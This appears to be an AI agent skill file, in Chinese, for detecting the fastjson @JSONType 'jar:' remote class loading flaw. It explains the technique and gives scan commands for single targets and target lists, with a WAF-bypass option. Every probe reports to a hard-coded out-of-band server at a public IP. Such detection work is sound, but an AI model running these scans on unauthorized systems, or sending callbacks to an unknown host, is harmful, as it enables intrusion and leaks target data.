---
name: java-vuln
description: "Java 漏洞检测插件集。用 plugins/ 下的插件对 Java 组件/框架漏洞做带外 (OOB) 检测，当前内置 fastjson 插件：检测 fastjson 1.2.66–1.2.83 @JSONType jar: 远程类加载 RCE（autoType 关闭也生效，仅探测不执行代码）。触发场景：用户说「检测 fastjson」「fastjson 漏洞扫描」「这个接口有没有 fastjson/@type 漏洞」「JSONType RCE」「Java 漏洞检测」「java-vuln」，或给出目标 URL 要求探测 fastjson 反序列化/远程类加载漏洞时使用。"
---

# Java 漏洞检测插件集 (java-vuln)

插件式 Java 漏洞检测。每个插件一个目录，自带探测脚本；本 skill 只做注册表与调用约定。

## 插件注册表

| 插件 | 漏洞 | 入口脚本 | 依赖 |
|---|---|---|---|
| `fastjson` | fastjson 1.2.66–1.2.83 `@JSONType` `jar:` 远程类加载 RCE（CVE-2022-25845 同期技术，autoType 关闭仍可触发） | `plugins/fastjson/poc.py` | `pip install requests cryptography` |

## 通用约定

- 所有插件只做 **OOB 带外探测**（观察目标是否回连 interactsh），不投递代码、不执行命令。
- OOB 服务器（interactsh，裸 IPv4 + `-scan-everywhere` 模式）默认：`http://111.124.203.18:50050`。
  可用环境变量 `OOB_URL` 覆盖。
- 仅对已授权目标使用。

## fastjson 插件

原理：fastjson `checkAutoType` 对任意 `@type` 值先做 `@JSONType` 探测
(`getResourceAsStream`)。`@type` 为点编码的 `jar:http://<decIP>:<port>/<id>!/<entry>` 时，
JVM 在类名校验前就先通过 HTTP 拉取远程 jar —— 该 OOB 请求在各 JDK/容器组合下都会发出，
且不依赖 autoType、对 `JSON.parseObject(body, Dto.class)` 类型绑定同样生效。
interactsh 收到带关联 id 的 HTTP 请求即判定漏洞存在（JDK 9+ 为 SSRF，JDK 8 可达 RCE）。

### 准备

```bash
pip install requests cryptography
```

### 0) 自检 OOB 服务器（扫描前建议先跑）

```bash
cd ~/.codex/skills/java-vuln/plugins/fastjson
python3 poc.py verify --oob http://111.124.203.18:50050
```

输出 `[+] OK: OOB server works end-to-end` 才继续。

### 1) 扫描

```bash
# 单目标
python3 poc.py scan --oob http://111.124.203.18:50050 -t http://target:8080/api/parse

# 目标列表（每行一个完整 URL）
python3 poc.py scan --oob http://111.124.203.18:50050 -f targets.txt

# 带鉴权头 / 代理 / WAF 绕过
python3 poc.py scan --oob http://111.124.203.18:50050 -t <url> \
  -H 'Cookie: session=...' -H 'Authorization: Bearer ...' \
  -x http://127.0.0.1:8080 --ghost
```

常用参数：

| 参数 | 说明 |
|---|---|
| `-t URL` | 目标完整 URL（含 path），可重复 |
| `-f FILE` | 目标列表文件，每行一个 URL |
| `-H 'Name: Value'` | 附加请求头（可重复），用于鉴权后的服务 |
| `-x PROXY` | 目标流量走 http/https 代理 |
| `--ghost` | Ghost-Bits 全角 `\u` 编码绕过签名 WAF |
| `--wait 10s` / `--interval 2s` | 回连轮询窗口 / 间隔（慢网络加大 `--wait`） |
| `-v` | 打印每条 payload 与轮询错误 |

### 2) 结果判读

- `[+] VULNERABLE <target>`：收到 OOB 回连 → 漏洞存在（附回连来源 IP 与请求行）。
  JDK 8 = 可达 RCE；JDK 9+ = SSRF（远程 jar 已拉取，defineClass 被挡）。
- `no callback`：窗口内无回连。可能是无漏洞、safeMode 开启、无出网，或 WAF 拦截；
  无回连且怀疑 WAF 时用 `--ghost` 复测。
- 退出码：`1` = 至少一个目标命中，`0` = 无命中（便于 CI/脚本）。

## 新增插件约定

在 `plugins/<name>/` 放入口脚本（建议单文件、`python3 poc.py --help` 自描述），
并在上方注册表登记：插件名、漏洞、入口脚本、依赖。保持「只探测、OOB 判定」原则。
